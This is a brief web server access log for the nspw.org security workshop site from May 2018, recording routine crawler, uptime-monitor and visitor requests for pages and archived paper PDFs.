97.106.117.212 - - [02/May/2018:15:32:08 -0400] "GET /2018/organizers HTTP/1.1" 200 10084 "-" "-"
66.249.64.217 - - [02/May/2018:15:32:09 -0400] "GET /current/oc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
97.106.117.212 - - [02/May/2018:15:32:11 -0400] "GET / HTTP/1.1" 200 8170 "-" "-"
5.14.208.156 - - [02/May/2018:15:32:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.14.208.156 - - [02/May/2018:15:32:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:15:34:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:15:34:30 -0400] "GET /1999/oc.html HTTP/1.1" 200 5369 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:15:34:32 -0400] "GET /2016/organizers HTTP/1.1" 200 3781 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [02/May/2018:15:34:50 -0400] "GET /papers/1996/nspw1996-blakley.pdf HTTP/1.1" 200 1412335 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
77.88.47.40 - - [02/May/2018:15:35:40 -0400] "GET /2013/dates HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:15:39:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [02/May/2018:15:40:02 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.215 - - [02/May/2018:15:40:11 -0400] "GET /current/pc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.217 - - [02/May/2018:15:40:57 -0400] "GET /2009/proceedings/2006/nspw2006-crawford.pdf HTTP/1.1" 200 401281 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
